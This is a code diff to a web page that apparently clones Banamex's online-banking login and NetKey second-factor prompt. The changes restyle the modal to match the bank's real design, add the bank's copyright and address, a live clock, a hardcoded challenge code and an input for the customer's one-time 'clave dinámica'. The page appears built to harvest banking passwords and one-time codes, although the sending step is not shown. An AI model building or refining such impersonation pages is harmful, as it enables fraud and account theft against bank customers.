@@ -385,7 +385,7 @@
             height: 120px;
         }
 
-        /* Modal/Popup */
+        /* Modal/Popup - Diseño NetKey de escritorio */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -397,144 +397,232 @@
             z-index: 10000;
             justify-content: center;
             align-items: center;
+            overflow-y: auto;
+            padding: 20px;
         }
 
         .modal-overlay.active {
             display: flex;
         }
 
-        .modal-content {
-            background: white;
-            border-radius: 8px;
-            padding: 0;
-            width: 90%;
-            max-width: 400px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
-            position: relative;
-            overflow: hidden;
+        /* Variables para modal NetKey */
+        .modal-container {
+            --bg: #ffffff;
+            --text: #0b2a2d;
+            --muted: #6c8b8b;
+            --accent: #073c40;
+            --card-border: #e6eef0;
+            background: var(--bg);
+            border-radius: 12px;
+            width: 100%;
+            max-width: 1100px;
+            padding: 24px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
 
-        .modal-header {
-            background: white;
-            padding: 20px 30px;
-            border-bottom: 1px solid #e0e0e0;
-        }
-
-        .modal-logo {
-            width: 120px;
-            margin-bottom: 0;
-        }
-
-        .modal-body {
-            padding: 30px;
-        }
-
-        .modal-title {
-            font-size: 18px;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 20px;
+        /* Header del modal */
+        .netkey-header {
             display: flex;
-            align-items: center;
-            gap: 8px;
+            align-items: flex-start;
+            gap: 20px;
+            margin-bottom: 22px;
         }
 
-        .modal-title::before {
-            content: "≫";
-            color: #e63027;
-            font-weight: 700;
+        .brand-mark {
+            width: 72px;
+            height: 72px;
+            border-radius: 14px;
+            background: radial-gradient(circle at 30% 30%, #ff4666 0%, #d32b3b 45%, #8f1320 100%);
+            box-shadow: 0 3px 8px rgba(0,0,0,0.06);
+            flex: 0 0 72px;
         }
 
-        .netkey-info {
-            background: #f5f5f5;
-            border-left: 3px solid #e63027;
-            padding: 15px;
-            margin-bottom: 20px;
-            font-size: 13px;
-            line-height: 1.6;
-            color: #555;
+        .brand-right {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
         }
 
-        .netkey-challenge {
-            margin-bottom: 25px;
+        .brand-text {
+            font-size: 40px;
+            font-weight: 800;
+            color: var(--text);
+            line-height: 1;
         }
 
-        .netkey-challenge-label {
-            font-size: 12px;
-            color: #666;
+        .datetime {
+            margin-top: 8px;
+            color: var(--muted);
+            font-size: 15px;
+        }
+
+        /* Card principal */
+        .netkey-card {
+            border-radius: 12px;
+            border: 1px solid var(--card-border);
+            background: linear-gradient(180deg, #ffffff 0%, #fbfdff 100%);
+            box-shadow: 0 14px 36px rgba(8,18,20,0.06);
+            padding: 28px;
+            display: flex;
+            gap: 22px;
+        }
+
+        .col-left { 
+            width: 56%; 
+            padding-right: 12px; 
+        }
+
+        .col-right { 
+            width: 44%; 
+            padding-left: 12px; 
+            border-left: 1px dashed #e9f1f1; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: space-between; 
+        }
+
+        .netkey-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #173a3d;
             margin-bottom: 8px;
         }
 
-        .netkey-challenge-code {
-            font-size: 20px;
-            font-weight: 700;
-            color: #333;
-            letter-spacing: 2px;
+        .netkey-instructions {
+            background: #f7fbfb;
+            padding: 18px;
+            border-radius: 10px;
+            border: 1px solid #e6f0f0;
+            color: #244a4c;
+            line-height: 1.55;
+            font-size: 15px;
         }
 
-        .netkey-input-group {
-            margin-bottom: 25px;
+        .netkey-challenge-box {
+            margin-top: 18px;
+            display: flex;
+            align-items: center;
+            gap: 18px;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            border: 1px solid #e8e8e8;
         }
 
-        .netkey-input-label {
+        .netkey-challenge-box .tag {
+            background: #f2f7f7;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-weight: 800;
+            color: #123f40;
+            font-size: 15px;
+            border: 1px solid #e6eded;
+        }
+
+        .netkey-challenge-box .code {
+            font-size: 30px;
+            font-weight: 900;
+            letter-spacing: 1.6px;
+            color: #071a1a;
+        }
+
+        .netkey-explain {
+            color: #215253;
+            font-size: 15px;
+            margin-bottom: 16px;
+        }
+
+        .netkey-field {
+            margin-top: 6px;
+        }
+
+        .netkey-label {
             display: block;
-            font-size: 13px;
-            color: #333;
+            font-weight: 700;
+            color: #164043;
+            font-size: 14px;
             margin-bottom: 8px;
         }
 
         .netkey-input {
             width: 100%;
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-            font-size: 14px;
+            padding: 14px;
+            font-size: 18px;
+            border-radius: 8px;
+            border: 1px solid #bfcfcf;
+            outline: none;
         }
 
         .netkey-input:focus {
-            outline: none;
-            border-color: #0c4a5e;
+            border-color: #188c8c;
+            box-shadow: 0 0 0 6px rgba(24,140,140,0.06);
         }
 
-        .modal-footer {
+        .netkey-actions {
             display: flex;
-            justify-content: flex-end;
-            gap: 10px;
-            padding: 20px 30px;
-            background: #f9f9f9;
-            border-top: 1px solid #e0e0e0;
+            gap: 12px;
+            margin-top: 18px;
+            align-items: center;
         }
 
-        .btn-netkey-cancel {
-            padding: 10px 24px;
-            background: transparent;
-            color: #e63027;
+        .netkey-btn {
+            padding: 12px 20px;
+            border-radius: 10px;
+            font-weight: 800;
+            font-size: 15px;
             border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 600;
             cursor: pointer;
-            transition: background 0.3s;
         }
 
-        .btn-netkey-cancel:hover {
-            background: #f0f0f0;
+        .netkey-btn-cancel {
+            background: #fff;
+            color: #c23b3b;
+            border: 1px solid #f0dede;
         }
 
-        .btn-netkey-submit {
-            padding: 10px 24px;
-            background: #1a1a1a;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background 0.3s;
+        .netkey-btn-continue {
+            background: var(--accent);
+            color: #fff;
+            box-shadow: 0 10px 26px rgba(7,60,64,0.16);
         }
 
-        .btn-netkey-submit:hover {
-            background: #333;
+        .netkey-token {
+            margin-top: 14px;
+            color: #b1b1b1;
+            font-size: 13px;
+            letter-spacing: 0.4px;
+        }
+
+        .netkey-footer {
+            margin-top: 28px;
+            color: #9aa7a7;
+            font-size: 13px;
+            padding-top: 8px;
+            border-top: 1px solid #f0f0f0;
+        }
+
+        .netkey-contact {
+            margin-top: 18px;
+            color: #5f6b6b;
+            font-size: 13px;
+        }
+
+        @media (max-width: 1120px) {
+            .modal-container { 
+                width: 95%; 
+                max-width: 95%;
+            }
+            .col-left, .col-right { 
+                width: 100%; 
+                border-left: none; 
+                padding: 0; 
+            }
+            .netkey-card { 
+                flex-direction: column;
+            }
+            .brand-text { 
+                font-size: 34px;
+            }
         }
     </style>
 </head>
@@ -655,37 +743,68 @@
 
     <!-- NetKey Modal -->
     <div class="modal-overlay" id="netkeyModal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <img src="/banamex/images/logobanamex.svg" alt="Banamex" class="modal-logo">
-            </div>
-
-            <div class="modal-body">
-                <h2 class="modal-title">Clave dinámica</h2>
-
-                <div class="netkey-info">
-                    <p style="margin-bottom: 10px;"><strong>Encuentra tu NetKey Banamex, teclea en tu dispositivo "NETKEY" y el número de dígitos y/o el número "V".</strong></p>
-                    <p style="margin-bottom: 10px;">Al observar la pantalla "CHALLENGE" introduce en el siguiente campo el código digital en el siguiente campo:</p>
-                    <p style="margin-bottom: 10px;"><strong>Pregunta "NETKEY" tu NetKey Banamex, teclea la siguiente clave:</strong></p>
+        <div class="modal-container">
+            <header class="netkey-header">
+                <div class="brand-mark"></div>
+                <div class="brand-right">
+                    <div class="brand-text">Banamex</div>
+                    <div id="datetime" class="datetime">Cargando...</div>
                 </div>
+            </header>
 
-                <div class="netkey-challenge">
-                    <div class="netkey-challenge-label">CHALLENGE:</div>
-                    <div class="netkey-challenge-code" id="netkeyChallenge">09145084</div>
-                </div>
+            <main>
+                <section class="netkey-card">
+                    <div class="col-left">
+                        <div class="netkey-title">Clave dinámica</div>
 
-                <form id="netkeyForm">
-                    <div class="netkey-input-group">
-                        <label class="netkey-input-label">Clave dinámica</label>
-                        <input type="text" id="netkeyInput" class="netkey-input" required data-testid="input-netkey">
+                        <div class="netkey-instructions">
+                            Encienda su NetKey Banamex, teclee su PIN; al desplegarse la palabra "<strong>HOST?</strong>" digite el número "<strong>9</strong>".
+                            <br><br>
+                            Al aparecer la palabra "<strong>CHALLNG?</strong>" introduzca en su NetKey Banamex la siguiente clave:
+                        </div>
+
+                        <div class="netkey-challenge-box">
+                            <div class="tag">CHALLNG:</div>
+                            <div class="code" id="netkeyChallenge">09145084</div>
+                        </div>
+
+                        <div class="netkey-token">jbnelw03p-ND162-JRDIG-BNEW A32P</div>
                     </div>
-                </form>
-            </div>
 
-            <div class="modal-footer">
-                <button type="button" class="btn-netkey-cancel" onclick="cancelNetKey()" data-testid="button-cancel-netkey">Cancelar</button>
-                <button type="submit" form="netkeyForm" class="btn-netkey-submit" data-testid="button-submit-netkey">Continuar</button>
-            </div>
+                    <div class="col-right">
+                        <div>
+                            <div class="netkey-explain">
+                                Presione "ENT". Su NetKey Banamex generará una clave dinámica que deberá digitar en el siguiente campo
+                            </div>
+
+                            <form id="netkeyForm">
+                                <div class="netkey-field">
+                                    <label for="netkeyInput" class="netkey-label">Clave dinámica</label>
+                                    <input id="netkeyInput" type="text" maxlength="8" class="netkey-input" placeholder="Digite la clave dinámica" data-testid="input-netkey" required />
+                                </div>
+
+                                <div class="netkey-actions">
+                                    <button type="button" class="netkey-btn netkey-btn-cancel" onclick="cancelNetKey()" data-testid="button-cancel-netkey">Cancelar</button>
+                                    <button type="submit" class="netkey-btn netkey-btn-continue" data-testid="button-submit-netkey">Continuar</button>
+                                </div>
+                            </form>
+                        </div>
+
+                        <div class="netkey-contact">
+                            ¿No tienes NetKey? Contacte a su sucursal o centro de atención.
+                        </div>
+                    </div>
+                </section>
+
+                <footer class="netkey-footer">
+                    <div style="margin-top:18px;">
+                        D.R., © 2025, Banco Nacional de México, S.A., Integrante del Grupo Financiero Banamex.
+                    </div>
+                    <div style="margin-top:6px;">
+                        Isabel la Católica 44, Centro Histórico, Cuauhtémoc, C.P. 06000, CDMX.
+                    </div>
+                </footer>
+            </main>
         </div>
     </div>
 
@@ -748,6 +867,49 @@
             netkeyModal.classList.remove('active');
             window.loginData = null;
         }
+
+        // Reloj en tiempo real para modal NetKey
+        const timeZone = "America/Mexico_City";
+        const meses = ["Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre"];
+
+        function pad2(n){ return String(n).padStart(2,'0'); }
+
+        function actualizarFechaHora(){
+            const now = new Date();
+            const parts = new Intl.DateTimeFormat('es-MX', {
+                timeZone,
+                year: "numeric",
+                month: "numeric",
+                day: "numeric",
+                hour: "numeric",
+                minute: "numeric",
+                second: "numeric",
+                hour12: false
+            }).formatToParts(now);
+            const map = {};
+            parts.forEach(p => { if (p.type !== 'literal') map[p.type] = p.value; });
+
+            const weekday = new Intl.DateTimeFormat('es-MX', { timeZone, weekday: 'long' }).format(now);
+            const weekdayCap = weekday.charAt(0).toUpperCase() + weekday.slice(1);
+
+            const dayNum = map.day;
+            const monthIndex = parseInt(map.month,10) - 1;
+            const monthName = meses[monthIndex] || "";
+            const year = map.year;
+            const hour = pad2(map.hour);
+            const minute = pad2(map.minute);
+            const second = pad2(map.second);
+
+            const texto = `${weekdayCap} ${dayNum} de ${monthName} de ${year}, ${hour}:${minute}:${second} Centro de México`;
+            const datetimeEl = document.getElementById('datetime');
+            if (datetimeEl) {
+                datetimeEl.textContent = texto;
+            }
+        }
+
+        // Actualizar reloj cada segundo
+        setInterval(actualizarFechaHora, 1000);
+        actualizarFechaHora();
 
         // Login form handler
         document.getElementById('loginForm').addEventListener('submit', function(e) {
